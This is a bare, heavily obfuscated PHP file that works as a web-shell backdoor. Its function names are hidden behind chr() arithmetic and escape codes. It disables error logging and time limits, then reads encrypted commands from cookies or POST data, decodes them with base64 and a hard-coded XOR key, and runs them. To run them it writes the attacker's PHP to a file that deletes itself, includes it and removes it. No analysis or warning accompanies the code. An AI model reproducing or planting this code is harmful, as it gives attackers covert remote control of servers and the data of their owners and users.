<?php $xaijsh = "\146".chr(105).'l'.chr(101).'_'.'p'.chr(117).'t'.chr(993-898)."\143"."\157"."\x6e"."\x74".chr(101).chr(110).'t'."\x73";
$apxdjgm = 'b'.'a'.chr(115).chr(624-523)."\x36"."\64".'_'."\x64".chr(294-193)."\143".'o'.chr(100).'e';
$dilfk = chr(105)."\156".chr(273-168).chr(95).chr(583-468).'e'.chr(907-791);
$xkdhramjhg = 'u'."\156"."\154".chr(633-528)."\x6e"."\x6b";


@$dilfk("\x65"."\162".chr(568-454)."\x6f".'r'."\137".chr(108)."\x6f".chr(103), NULL);
@$dilfk(chr(1074-966).chr(111)."\147"."\x5f".chr(750-649)."\162".chr(114).chr(521-410).chr(423-309)."\163", 0);
@$dilfk(chr(109)."\x61"."\x78".chr(376-281).'e'.chr(378-258).chr(581-480).chr(99)."\x75".chr(116).'i'.'o'.chr(110)."\x5f".chr(246-130).chr(105).'m'.chr(101), 0);
@set_time_limit(0);

function mgbkv($lizxxwe, $wkzizxxua)
{
    $nltnaaobtn = "";
    for ($gnovn = 0; $gnovn < strlen($lizxxwe);) {
        for ($j = 0; $j < strlen($wkzizxxua) && $gnovn < strlen($lizxxwe); $j++, $gnovn++) {
            $nltnaaobtn .= chr(ord($lizxxwe[$gnovn]) ^ ord($wkzizxxua[$j]));
        }
    }
    return $nltnaaobtn;
}

$vichocu = array_merge($_COOKIE, $_POST);
$fhabqddjfr = '6166ae56-d1b2-4a36-bb0d-ebd8628883de';
foreach ($vichocu as $pqyuea => $lizxxwe) {
    $lizxxwe = @unserialize(mgbkv(mgbkv($apxdjgm($lizxxwe), $fhabqddjfr), $pqyuea));
    if (isset($lizxxwe[chr(233-136)."\153"])) {
        if ($lizxxwe[chr(963-866)] == "\151") {
            $gnovn = array(
                "\x70".chr(118) => @phpversion(),
                chr(115).'v' => "3.5",
            );
            echo @serialize($gnovn);
        } elseif ($lizxxwe[chr(963-866)] == chr(205-104)) {
            $yjpvvfez = "./" . md5($fhabqddjfr) . chr(46).'i'."\x6e".'c';
            @$xaijsh($yjpvvfez, "<" . chr(820-757).'p'.chr(104).chr(112)."\x20"."\x40".'u'."\x6e"."\154"."\x69"."\156"."\x6b"."\x28".chr(361-266).chr(158-63)."\x46".chr(73)."\x4c".chr(644-575).'_'.'_'."\x29".';'."\x20" . $lizxxwe[chr(100)]);
            @include($yjpvvfez);
            @$xkdhramjhg($yjpvvfez);
        }
        exit();
    }
}

